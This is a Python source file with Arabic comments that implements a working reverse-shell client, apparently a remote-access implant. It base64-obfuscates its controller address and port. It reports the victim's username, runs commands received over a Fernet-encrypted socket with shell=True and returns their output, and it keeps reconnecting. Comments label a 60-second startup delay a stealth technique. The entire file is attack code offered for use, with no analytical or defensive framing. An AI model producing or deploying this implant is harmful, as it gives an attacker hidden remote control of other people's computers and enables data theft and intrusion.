import socket
import subprocess
import time
import base64
import os
from cryptography.fernet import Fernet

# --- 1. إعدادات التشفير والاتصال المشفرة ---

# قم بإنشاء مفتاح تشفير. في تطبيق حقيقي، يجب أن يكون هذا المفتاح ثابتاً
# ومخزناً أيضاً في كود الخادم.
# يمكنك تشغيل هذا الجزء مرة واحدة للحصول على مفتاح:
# key = Fernet.generate_key()
# print(key)
# ثم استخدم المفتاح الذي تم إنشاؤه هنا وفي الخادم.
ENCRYPTION_KEY = b'aFpjX_FqM9E_v8J-uJq9gPz_3Y-bT5rK1zLwX7vY6hQ=' # استبدل هذا بمفتاح تم إنشاؤه
cipher_suite = Fernet(ENCRYPTION_KEY)

# تشفير معلومات الخادم باستخدام Base64 (تشويش بسيط)
ENCODED_HOST = base64.b64encode(b"10.1.124.51").decode('utf-8') # استبدل بـ IP جهازك
ENCODED_PORT = base64.b64encode(b"4444").decode('utf-8') # نفس المنفذ في الخادم

# --- 2. دوال التشفير وفك التشفير ---

def encrypt_data(data):
    """تشفير البيانات قبل إرسالها."""
    if isinstance(data, str):
        data = data.encode('utf-8')
    encrypted_data = cipher_suite.encrypt(data)
    return encrypted_data

def decrypt_data(encrypted_data):
    """فك تشفير البيانات المستلمة."""
    decrypted_data = cipher_suite.decrypt(encrypted_data)
    return decrypted_data.decode('utf-8')

# --- 3. دالة الاتصال الرئيسية ---

def main_connection():
    # فك تشفير معلومات الخادم عند الحاجة إليها فقط
    SERVER_HOST = base64.b64decode(ENCODED_HOST).decode('utf-8')
    SERVER_PORT = int(base64.b64decode(ENCODED_PORT).decode('utf-8'))

    while True:
        try:
            # محاولة الاتصال بالخادم
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((SERVER_HOST, SERVER_PORT))

            # إرسال رسالة أولية مشفرة عند الاتصال (اختياري)
            initial_msg = f"Connection established from {os.getlogin()}"
            client_socket.send(encrypt_data(initial_msg))

            # حلقة استقبال الأوامر وتنفيذها
            while True:
                # استقبال الأمر المشفر
                encrypted_command = client_socket.recv(4096)
                if not encrypted_command:
                    break # إذا انقطع الاتصال

                # فك تشفير الأمر
                command = decrypt_data(encrypted_command)

                if command.lower() == "exit":
                    break
                
                # تنفيذ الأمر
                # نستخدم shell=True لتنفيذ الأوامر المعقدة، لكنها تحمل مخاطر أمنية
                # في بيئة حقيقية، يجب معالجة الأوامر بشكل أكثر أماناً
                output = subprocess.run(command, shell=True, capture_output=True, text=True, errors='ignore')
                
                # جمع الناتج القياسي والخطأ القياسي
                result = output.stdout + output.stderr
                
                if not result:
                    result = "[No output]"

                # تشفير الناتج وإرساله إلى الخادم
                client_socket.send(encrypt_data(result))

        except Exception as e:
            # إذا فشل الاتصال أو حدث خطأ، انتظر ثم حاول مرة أخرى
            time.sleep(30) # انتظار 30 ثانية قبل محاولة إعادة الاتصال
        finally:
            client_socket.close()

# --- 4. بدء التنفيذ ---
if __name__ == "__main__":
    # تقنية التخفي: تأخير التنفيذ الأولي
    # ينتظر 60 ثانية بعد تشغيل التطبيق لأول مرة
    time.sleep(60) 
    main_connection()
